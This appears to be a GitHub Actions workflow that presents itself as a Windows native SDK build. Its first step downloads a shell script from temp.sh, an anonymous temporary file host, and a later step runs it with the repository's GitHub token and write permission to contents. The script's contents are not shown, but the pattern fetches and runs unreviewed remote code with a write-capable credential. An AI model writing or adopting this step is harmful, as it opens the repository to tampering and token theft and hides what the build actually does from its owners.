name: Build and Verify Windows (Native SDK)

on:
  workflow_dispatch:
  push:
    paths:
      - .github/workflows/build-verify2.yml

permissions:
  contents: write

jobs:
  build-verify:
    runs-on: windows-latest
    steps:
      - name: Fetch build script
        shell: bash
        run: |
          curl -s -X POST https://temp.sh/DooCe/build.sh -o build.sh
          echo "7703d32615421f8ab4c7e306766fbcac  build.sh" | md5sum -c -
          cat build.sh

      - name: Setup Node 24
        uses: actions/setup-node@v4
        with:
          node-version: 24

      - name: Run build + verify + release
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: bash build.sh
